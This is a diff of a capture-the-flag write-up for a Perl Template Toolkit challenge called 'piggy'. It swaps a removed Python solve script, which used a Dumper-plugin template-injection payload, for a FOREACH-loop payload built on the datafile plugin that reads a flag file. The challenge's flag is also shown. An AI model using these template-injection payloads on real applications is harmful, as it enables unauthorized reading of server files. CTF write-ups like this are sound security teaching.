@@ -17,7 +17,7 @@ Who is such a piggy (ツ)
 > [!NOTE]
 > Major credits to [Dominik](https://github.com/Dominilk) and [Neverbolt](https://github.com/Neverbolt), but also [lavish](https://github.com/lavish) and [ar0x](https://github.com/ar0x4) who contributed to the solution.
 
-Starting off, we inspected the provided code which appears to be a `perl` application using `Template Toolkit`. <br/>
+Starting off, we inspected the provided code which appeared to be a `perl` application using `Template Toolkit`. <br/>
 ```perl
 use strict;
 use warnings;
@@ -105,29 +105,14 @@ After more reading we found the plugin [datafile](https://www.template-toolkit.o
 [% USE file = datafile('./flag_980aef6e461ca1009ea62da051753b38.txt') %][% file %]
 ```
 
-Trying to read the contents of the file though turns out to be rather hard with that plugin as the response just contains `Template::Plugin::Datafile=ARRAY(0x5c45b52c3050)` and not the actual content. <br/>
-After some more reading we found another plugin called [Dumper](https://www.template-toolkit.org/docs/modules/Template/Plugin/Dumper.html) which is able to dump the contents of  variables or objects. <br/>
-The final exploit can be seen below. <br/>
+The payload above only returned `Template::Plugin::Datafile=ARRAY(0x5557cd5d87f0)` which didn't really help us. <br/>
+Playing around some more with the `datafile` plugin we found a way to output a files' contents using a for-loop. <br/>
 ```py
-import requests
-
-base_URl = 'http://0rvfc22lv207i818178crbwvmq6vef.piggy.web.jctf.pro/'
-
-payload = {
-    'debug': f"[% USE f = datafile('./flag_980aef6e461ca1009ea62da051753b38.txt') %][% USE Dumper %][% Dumper.dump(f) %]",
-}
-
-res = requests.post(f'{base_URl}debug', data=payload)
-
-print(res.text)
+[% USE flag = datafile('./flag_980aef6e461ca1009ea62da051753b38.txt', delim = ' ') %] [% FOREACH f = flag %] [% f.Here %] [%END%]
 ```
 
-Executing the script returns the flag which concludes this writeup. <br/>
+Using our exploit we obtained the flag which concludes this writeup. <br/>
 ```sh
 $ python3 solve.py 
-$VAR1 = bless( [
-                 {
-                   'Here is your fat flag' => 'justCTF{0iNk_oinKxD}'
-                 }
-               ], 'Template::Plugin::Datafile' );
-```<
+  justCTF{0iNk_oinKxD} 
+```
